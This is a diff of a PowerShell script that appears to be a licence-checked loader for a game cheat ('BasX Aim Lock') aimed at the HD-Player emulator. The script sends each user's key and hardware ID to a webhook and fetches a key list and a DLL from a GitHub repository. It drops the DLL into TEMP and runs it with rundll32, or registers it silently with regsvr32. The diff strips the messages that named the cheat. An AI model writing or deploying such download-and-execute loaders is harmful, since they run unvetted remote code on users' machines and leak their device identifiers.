@@ -7,8 +7,8 @@ $LogBody = @{
     content = "New Login Attempt - Key: $UserKey - HWID: $MyHWID"
 } | ConvertTo-Json
 Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $LogBody -ContentType "application/json"
-# ----------------------
 
+# --- Key Validation ---
 $KeyUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/Power-Shell-Project/refs/heads/main/keys.json"
 $Keys = Invoke-RestMethod -Uri $KeyUrl
 
@@ -17,33 +17,25 @@ if (-not $Keys.PSObject.Properties[$UserKey]) {
 }
 elseif ($Keys.$UserKey -eq "" -or $Keys.$UserKey -eq $MyHWID) {
     Write-Host "Successfully!" -ForegroundColor Green
-    Write-Host "Initializing BasX Aim Lock system..." -ForegroundColor Cyan
-
     $DllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/Power-Shell-Project/refs/heads/main/gralloc.blue.dll"
     $DllPath = "$env:TEMP\gralloc.blue.dll"
     
     try {
         (New-Object Net.WebClient).DownloadFile($DllUrl, $DllPath)
         [console]::beep(500,300)
-
-        $TargetProcess = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
         
-        if ($TargetProcess) {
+        $Target = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
+        if ($Target) {
             Start-Process -FilePath "rundll32.exe" -ArgumentList "`"$DllPath`",DllMain"
             [console]::beep(800,500)
-            Write-Host "Successfully injected into HD-Player!" -ForegroundColor Green
-            Write-Host "BasX Aim Lock: Active (Press F8 in game)" -ForegroundColor Green
-        }
-        else {
+            Write-Host "Injected into HD-Player!" -ForegroundColor Green
+        } else {
             Start-Process -FilePath "regsvr32.exe" -ArgumentList "/s `"$DllPath`""
-            Write-Host "Standard Mode Active." -ForegroundColor Green
+            Write-Host "Standard Mode Active." -ForegroundColor Yellow
         }
+    } catch {
+        Write-Host "Error loading DLL." -ForegroundColor Red
     }
-    catch {
-        Write-Host "Error: Could not load system files." -ForegroundColor Red
-    }
-}
-else {
+} else {
     Write-Host "Invalid HWID!" -ForegroundColor Yellow
-    Write-Host "Your HWID: $MyHWID" -ForegroundColor Gray
 }
